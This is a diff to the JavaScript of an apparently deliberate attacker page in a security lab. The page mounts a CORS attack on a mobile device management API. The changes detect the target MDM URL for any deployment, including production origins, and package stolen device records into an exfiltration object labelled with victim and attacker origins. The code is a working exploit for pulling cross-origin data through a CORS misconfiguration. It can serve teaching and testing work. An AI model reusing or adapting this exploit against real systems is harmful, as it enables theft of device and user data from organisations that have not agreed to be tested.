@@ -321,8 +321,36 @@
                 // Attempt to steal device data via CORS vulnerability
                 console.log('🎯 Attempting CORS attack on MDM device API...');
                 
-                // Detect the current MDM URL (works for both localhost and 127.0.0.1)
-                const mdmUrl = window.location.protocol + '//' + window.location.hostname + ':5000';
+                // Detect the current MDM URL dynamically (supports any deployment)
+                let mdmUrl;
+                
+                // Check if we have MDM host URL from server-side configuration
+                const mdmHostUrl = '{{ mdm_host_url | default("") }}';
+                const currentPort = window.location.port;
+                const currentHost = window.location.hostname;
+                const currentProtocol = window.location.protocol;
+                
+                if (mdmHostUrl && mdmHostUrl !== '') {
+                    // Use server-provided MDM URL (most reliable)
+                    mdmUrl = mdmHostUrl;
+                } else if (currentPort === '8080' || currentPort === '{{ evil_port | default("8080") }}') {
+                    // Running on evil port, target main app on different port
+                    const targetPort = '{{ mdm_port | default("5000") }}';
+                    mdmUrl = currentProtocol + '//' + currentHost + ':' + targetPort;
+                } else if (currentPort === '{{ mdm_port | default("5000") }}') {
+                    // Same port as MDM, use current origin (single domain)
+                    mdmUrl = window.location.origin;
+                } else {
+                    // Production deployment - try to detect MDM URL
+                    // Default to current origin for single-domain deployments
+                    mdmUrl = window.location.origin;
+                }
+                
+                console.log('🎯 Environment Detection:');
+                console.log('Current URL:', window.location.href);
+                console.log('Current Port:', currentPort);
+                console.log('Server MDM URL:', mdmHostUrl);
+                console.log('Detected MDM URL:', mdmUrl);
                 
                 console.log('🎯 Attempting CORS attack...');
                 console.log('Target URL:', mdmUrl + '/cors/api/devices/detailed');
@@ -428,7 +456,8 @@
                 // In a real attack, this would send data to attacker's server
                 const exfilData = {
                     attack_timestamp: new Date().toISOString(),
-                    victim_origin: 'http://localhost:5000',
+                    victim_origin: mdmUrl, // Dynamic victim origin
+                    attacker_origin: window.location.origin,
                     stolen_records: deviceData.length,
                     sample_data: deviceData.slice(0, 5), // Send sample
                     attack_method: 'CORS misconfiguration',
